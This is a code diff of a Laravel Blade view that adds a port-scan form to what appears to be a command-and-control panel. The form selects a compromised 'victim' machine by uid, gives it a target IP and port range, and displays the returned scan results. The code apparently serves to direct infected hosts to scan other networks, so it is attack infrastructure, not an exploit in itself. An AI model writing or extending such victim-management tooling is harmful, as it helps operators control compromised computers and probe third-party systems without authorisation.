@@ -234,13 +234,40 @@
                             <div class="card">
                                 <div class="card-body">
                                     <h5 class="card-title">Scan</h5>
+                                    <form method="POST" action="{{ route('network.scanport') }}" class="row g-3">
+                                        @csrf
+                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
+                                            <div class="col-md-3">
+                                                <select class="form-select" name="victim_uid" id="validationDefault04" required>
+                                                    @foreach ($victims as $victim)
+                                                        <option value="{{ $victim->uid }}">{{ $victim->uid }}</option>
+                                                    @endforeach
+                                                </select>
+                                            </div>
+                                            <div class="col-md-2">
+                                                <input type="text" class="form-control" placeholder="ip" name="ip">
+                                            </div>
+                                            <div class="col-md-2">
+                                                <input type="number" class="form-control" name="port1" required min="1" max="65535" placeholder="port 1">
+                                            </div>
+                                            <div class="col-md-2">
+                                                <input type="number" class="form-control" name="port2" min="1" max="65535" placeholder="port 2">
+                                            </div>
+                                            <div class="col-md-1">
+                                                <button type="submit" class="btn btn-warning"><i class="bi bi-broadcast"></i></button>
+                                            </div>
+                                    </form>
                                     <div class="tab-content pt-2" id="borderedTabJustifiedContent">
                                         <div class="tab-pane fade show active" id="bordered-justified-home" role="tabpanel" aria-labelledby="home-tab">
-                                            <ul class="list-group">
-                                                @foreach (explode(' / ', $scan->result) as $item)
-                                                    <li class="list-group-item">{{ $item }}</li>
-                                                @endforeach
-                                            </ul>
+                                            @if (!empty($scan) && !empty($scan->result))
+                                                <ul class="list-group">
+                                                    @foreach (explode(' / ', $scan->result) as $item)
+                                                        @if (!empty($item))
+                                                            <li class="list-group-item">{{ $item }}</li>
+                                                        @endif
+                                                    @endforeach
+                                                </ul>
+                                            @endif
                                         </div>
                                     </div>
                                 </div>
